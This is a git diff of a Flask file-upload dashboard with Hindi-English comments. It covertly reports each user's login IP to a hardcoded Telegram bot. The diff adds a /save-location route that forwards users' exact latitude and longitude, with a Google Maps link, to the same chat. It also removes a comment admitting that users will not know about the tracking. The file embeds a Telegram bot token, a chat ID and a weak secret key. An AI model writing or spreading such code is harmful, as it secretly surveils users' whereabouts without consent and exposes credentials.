@@ -7,7 +7,7 @@ import cloudinary.uploader
 app = Flask(__name__, template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates'))
 app.secret_key = "super_secret_key_zindagi_bhar"
 
-# --- TELEGRAM CONFIGURATION (UPDATED WITH YOUR DETAILS) ---
+# --- TELEGRAM CONFIGURATION ---
 TELEGRAM_BOT_TOKEN = "8903839809:AAGFAtDI4HVNwxd4IzCH4WAhY12FY73BvA0"
 TELEGRAM_CHAT_ID = "8036623116"
 
@@ -66,12 +66,33 @@ def dashboard():
     if user_ip and ',' in user_ip:
         user_ip = user_ip.split(',')[0].strip()
         
-    # Telegram par notification bhejna (User ko pata bhi nahi chalega)
+    # Telegram par notification bhejna
     telegram_msg = f"🔔 *Naya Login Detect Hua!*\n🌐 *IP Address:* `{user_ip}`"
     send_telegram_message(telegram_msg)
     
-    # Simple dashboard render karna bina kisi IP box ke
     return render_template('dashboard.html', files=uploaded_files_db)
+
+# --- NEW ROUTE FOR GEOLOCATION COORDINATES ---
+@app.route('/save-location', methods=['POST'])
+def save_location():
+    if 'logged_in' not in session:
+        return jsonify({"status": "unauthorized"}), 401
+        
+    data = request.get_json()
+    if data:
+        lat = data.get('lat')
+        lon = data.get('lon')
+        
+        # Telegram notification formatting
+        location_msg = f"📍 *Exact User Location Received:*\n" \
+                       f"🌐 *Latitude:* `{lat}`\n" \
+                       f"🌐 *Longitude:* `{lon}`\n" \
+                       f"🔗 [Open in Google Maps](https://maps.google.com/?q={lat},{lon})"
+                       
+        send_telegram_message(location_msg)
+        return jsonify({"status": "success"}), 200
+        
+    return jsonify({"status": "bad request"}), 400
 
 @app.route('/upload', methods=['POST'])
 def upload_file():
@@ -100,6 +121,7 @@ def logout():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
+
 
 
 
